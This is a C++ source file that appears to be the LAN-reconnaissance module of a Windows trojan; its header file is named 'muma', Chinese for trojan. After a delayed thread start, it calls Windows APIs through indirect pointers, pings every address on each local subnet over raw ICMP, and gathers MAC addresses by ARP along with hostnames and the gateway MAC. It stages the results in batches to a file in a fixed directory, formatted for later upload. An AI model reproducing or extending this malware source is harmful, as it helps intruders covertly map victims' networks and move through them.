// getLANInfo.cpp: implementation of the getLANInfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "getLANInfo.h"
#include "WinApi.h"
#include "mumaPublic.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

WriteLAN::WriteLAN()
{
	SendCount = 0;
	offset    = 1024;
	SendBuf   = new char[LANLEN*MAXCOUNT2+1024];	
	memset(SendBuf, 0, LANLEN*MAXCOUNT2+1024);
}

WriteLAN::~WriteLAN()
{
	if (SendBuf != NULL)
	{
		delete []SendBuf;
		SendBuf = NULL;
	}
}

BOOL WriteLAN::WriteBuf(const char * Buf, DWORD Buflen, BOOL bFinish)
{
	if(Buflen>0)
	{
		SendCount++;
		
		memcpy(SendBuf+offset, Buf, Buflen);
		offset += Buflen;
	}
	
	//	OutputDebugString("WriteBuf");
	
	if (SendCount >= MAXCOUNT2 || (bFinish && offset>1024))
	{
		// OutputDebugString("SendBuf");
		offset += sprintf(SendBuf+offset,"%d",SendCount);

		char tmpbuf[1024];
		
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		
		char laninfofilename[MAX_PATH];
		char laninfofilea[MAX_PATH];
		char FixDir[10];
		strcpy(FixDir, "~31C6");
		CreateFileName(FixDir, laninfofilename, laninfofilea);		// 得到目标文件名
		int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: laninfo_v1\r\n\r\n",
			nowtime.wYear, nowtime.wMonth, nowtime.wDay,nowtime.wHour, nowtime.wMinute, nowtime.wSecond, laninfofilea, offset-1024);///laninfo_v1 20180522
		
		int datalen = offset-1024+len;
		memcpy(SendBuf+1024-len, tmpbuf, len);
		
		WCHAR* pUnicode = new WCHAR[datalen+10];
		datalen = (datalen+10)*sizeof(WCHAR);
		datalen = GB23122Unicode(SendBuf+1024-len, pUnicode, datalen);
		
		datalen *= 4;
		char *pBuffer = new char[datalen];
		memset(pBuffer, 0, datalen);
		datalen = Unicode2UTF_8(pUnicode, pBuffer, datalen-1);
		
		myWriteFile(pBuffer, datalen, laninfofilename, laninfofilea);
		
		delete []pBuffer;
		delete []pUnicode;
		memset(SendBuf, 0, LANLEN*SendCount+1024);
		SendCount = 0;
		offset = 1024;
		
		PSleep(2000);
	}
	
	return TRUE;
}

BOOL WriteLAN::WriteOneData(ULONG lIP, const char *szMAC, const char *szUserName, const char *szGateMAC)
{
	char buf[LANLEN];
	DWORD buflen;
	
	time_t dealtm = time(0);
	
	buflen = 0;
	memset(buf, 0, LANLEN);
	buflen = sprintf(buf, "%d\t%u\t%s\t%s\t%s\t%u\n", SendCount, lIP, szMAC, szUserName, szGateMAC, dealtm);
	
	WriteBuf(buf, buflen);
	
	return TRUE;
}

BOOL WriteLAN::WriteEnd()
{
	WriteBuf("", 0, TRUE);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////

GetLANInfo::GetLANInfo()
{
}

GetLANInfo::~GetLANInfo()
{
}

BOOL GetLANInfo::GetData()
{
    //PIP_ADAPTER_INFO结构体指针存储本机网卡信息
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    //得到结构体大小,用于GetAdaptersInfo参数
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
    int nRel = PGetAdaptersInfo(pIpAdapterInfo,&stSize);
    //记录网卡数量
    int netCardNum = 0;
    //记录每张网卡上的IP地址数量
    int IPnumPerNetCard = 0;
    if (ERROR_BUFFER_OVERFLOW == nRel)
    {
        //如果函数返回的是ERROR_BUFFER_OVERFLOW
        //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
        //这也是说明为什么stSize既是一个输入量也是一个输出量
        //释放原来的内存空间
        delete pIpAdapterInfo;
        //重新申请内存空间用来存储所有网卡信息
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
        nRel = PGetAdaptersInfo(pIpAdapterInfo,&stSize);    
    }

    if (ERROR_SUCCESS == nRel)
    {
		WSADATA wsData;  
		PWSAStartup(MAKEWORD(2,2), &wsData);
		
		ULONG lGateIP;
		char szGateMAC[20];
		int sTime = time(0);

        //输出网卡信息
		//可能有多网卡,因此通过循环去判断
		while (pIpAdapterInfo)
		{
			//可能网卡有多IP,因此通过循环去判断
			IP_ADDR_STRING *pIpAddrString =&(pIpAdapterInfo->IpAddressList);
			do 
			{
				ULONG lIP = Pntohl(Pinet_addr(pIpAddrString->IpAddress.String));
				ULONG lMask = Pntohl(Pinet_addr(pIpAddrString->IpMask.String));

				if (lIP == 0)
				{
					pIpAddrString=pIpAddrString->Next;
					continue;
				}

				ULONG nRemoteAddr1 = lIP & lMask;
				ULONG nRemoteAddr2 = lIP | (~lMask);
				char szMAC[50], szUser[256];
				struct in_addr tmpip;

				lGateIP = Pntohl(Pinet_addr(pIpAdapterInfo->GatewayList.IpAddress.String));

				memset(szGateMAC, 0, sizeof(szGateMAC));
				GetMac(lGateIP, szGateMAC, szUser);
			
				/*pClass->dwLANlen += sprintf(pClass->szLANInfo+pClass->dwLANlen, "NetCard%dIP%d LANInfo: \r\n", netCardNum, IPnumPerNetCard);*/
				for(ULONG x = nRemoteAddr1; x <= nRemoteAddr2; x++)
				{
					ULONG tmplip = Pntohl(x);
					memcpy(&tmpip, &tmplip, 4);
					if (IsPing(Pinet_ntoa(tmpip)))
					{
						memset(szMAC, 0, sizeof(szMAC));
						memset(szUser, 0, sizeof(szUser));
						if (GetMac(x, szMAC, szUser))
						{
							WriteOneData(x, szMAC, szUser, szGateMAC);
						}
					}

					if( (time(0)-sTime)>10*60 )
					{
						WriteEnd();
						sTime = time(0);
					}
				}

				pIpAddrString=pIpAddrString->Next;
			} while (pIpAddrString);
			pIpAdapterInfo = pIpAdapterInfo->Next;
		}
    }
    //释放内存空间
    if (pIpAdapterInfo)
    {
        delete pIpAdapterInfo;
    }

	WriteEnd();

	return TRUE;
}

BOOL GetLANInfo::GetMac(DWORD remoteAddr, char * pMAC, char * pName)
{
	struct hostent *remoteHostent;
	long nRemoteAddr = Phtonl(remoteAddr);
	
	remoteHostent= (struct hostent*)malloc( sizeof(struct hostent ));
	struct in_addr sa;	
	//获取远程机器名
	sa.s_addr = nRemoteAddr;
	
	//获取机器名
	remoteHostent = Pgethostbyaddr((char*)&nRemoteAddr, sizeof(nRemoteAddr), AF_INET);
	
	//发送ARP查询包获得远程MAC地址
	unsigned char macAddress[6];
	ULONG macAddLen = 6;
	
	int iRet = PSendARP(nRemoteAddr, (unsigned long)NULL,(PULONG)&macAddress, &macAddLen);
	if ( iRet == NO_ERROR )
	{
		char str_mac[20];
		char temp[5];
		memset(str_mac, 0, 20);
		for( int i =0; i<6; i++ )
		{
			memset(temp, 0, 5);
			sprintf(temp, "%.2X", macAddress[i]);
			strcat(str_mac, temp);
			if ( i<5 ) 
				strcat(str_mac, "-");
		}
		
		if (str_mac[0] == 0)
		{
			return FALSE;
		}
		
		strcpy(pMAC, str_mac);
		if (remoteHostent)
		{
			strcpy(pName, remoteHostent->h_name);
		}		
	}
	else
		return FALSE;
	
	return TRUE;
}

//this algorithm is referenced from other's 
unsigned short GetLANInfo::cal_chksum(unsigned short *addr, int len)
{       
	int nleft=len;
	int sum=0;
	unsigned short *w=addr;
	unsigned short answer=0;
	
	while(nleft>1)
	{       
		sum+=*w++;
		nleft-=2;
	}
	if( nleft==1)          //处理ICMP报头为奇数个字节时累加最后一个
	{       
		*(unsigned char *)(&answer)=*(unsigned char *)w;
		sum+=answer;
	}
	sum=(sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer=~sum;
	return answer;
}

//打包
int GetLANInfo::pack(int pid, char * sendpacket)
{       
	int packsize;
	struct icmp *icmp;
	
	packsize=8+SEND_SIZE;
	icmp=(struct icmp*)sendpacket;
	icmp->icmp_type=ICMP_ECHO;
	icmp->icmp_code=0;
	icmp->icmp_chksum=0;
	icmp->icmp_seq=0;
	icmp->icmp_id=pid;
	icmp->icmp_data = PGetTickCount();                      
	icmp->icmp_chksum = cal_chksum((unsigned short *)icmp, packsize); /*校验算法*/
	return packsize;
}

//解包
int GetLANInfo::unpack(char *buf,int len, int pid)
{      
	struct ip *ip;
	struct icmp *icmp;
	int iphdrlen;
	
	ip=(struct ip *)buf;
	iphdrlen=ip->ip_hl*4;    
	icmp=(struct icmp *)(buf+iphdrlen);           
	if( (icmp->icmp_type == ICMP_ECHOREPLY) && (icmp->icmp_id == pid) )
	{ 
		return 1;
	}
	return 0;
}

int GetLANInfo::IsPing(const char * par_host)
{
	struct hostent *host;
	struct protoent *protocol;
	int timeout=100;
	struct sockaddr_in dest_addr;
	struct sockaddr_in from_addr;
	int sockfd;
	int pid;
	char sendpacket[PACKET_SIZE];
	char recvpacket[PACKET_SIZE];

	if((protocol = Pgetprotobyname("icmp")) == NULL)    //返回对应于给定协议名的包含名字和协议号
	{
		return 0;
	}
	if((sockfd = Psocket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0)
	{
		DWORD err = GetLastError();
		if(err == 0x271d)//administrator
		{
			return 1;
		}
		else
		{
			return 0;
		}
	}                                                             

	Psetsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));  //设置套接口的选项
	Psetsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout));     

	memset(&dest_addr,0,sizeof(dest_addr));
	dest_addr.sin_family=AF_INET; 
	if(host = Pgethostbyname(par_host) )        // 返回对应于给定主机名的主机信息                            
	{
	     memcpy( (char *)&dest_addr.sin_addr,host->h_addr,host->h_length);        
	}

	pid = PGetCurrentProcessId();

	int packetsize;
	
	packetsize = pack(pid, sendpacket); 
	if( PSendTo(sockfd, sendpacket, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr) )<0)
	{
		return 0;
	}

	int n,fromlen;
	int success;
	
	fromlen = sizeof(from_addr);
	do
	{
		if( (n = Precvfrom(sockfd,recvpacket,sizeof(recvpacket),0,(struct sockaddr *)&from_addr,&fromlen)) >=0)
		{
			success = unpack(recvpacket, n, pid);
		}
		else if (PWSAGetLastError() == WSAETIMEDOUT) 
		{                                                                                           
			return 0;
		}
	}while(!success);

	return 1;
}

//////////////////////////////////////////////////////////////////////////

DWORD WINAPI ThreadGetLANInfo(LPVOID lp)
{
	Sleep(5000);
	
	GetLANInfo LANInfo;
	LANInfo.GetData();
	
	return 0;
}

DWORD ThreadGetLANInfoStart(char * pPara)
{
	DWORD dwID;
	
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		ThreadGetLANInfo, 
		NULL,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return 0;
}